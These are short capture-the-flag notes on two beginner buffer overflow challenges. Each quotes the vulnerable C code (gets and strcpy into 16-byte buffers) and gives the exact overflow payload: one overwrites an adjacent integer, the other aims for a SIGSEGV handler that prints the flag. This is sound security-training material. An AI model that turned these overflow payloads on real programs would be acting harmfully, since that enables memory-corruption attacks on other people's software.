
1.Local Target

-it use get

```
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  ```

-we need to overflow  input to change num to 65

```
  char input[16];
  int num = 64;
  
```

so 16 bytes to 'A' 16 and the payload  is  `b'AAAAAAAAAAAAAAAAAAAAAAAA\x41\x00\x00\x00'`
	but there padding 8bytes between  input and num . so use A 24 bytes .

---



2.buffer overflow 0

```


void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}



```

we need to overflow buf2 by 16 bytes + 4 bytes for `ebp` + p32(SIGSEGV handler address)

`aaaaaaaaaaaaaaaaaaaa\x0d\x13\x00\x00`

---

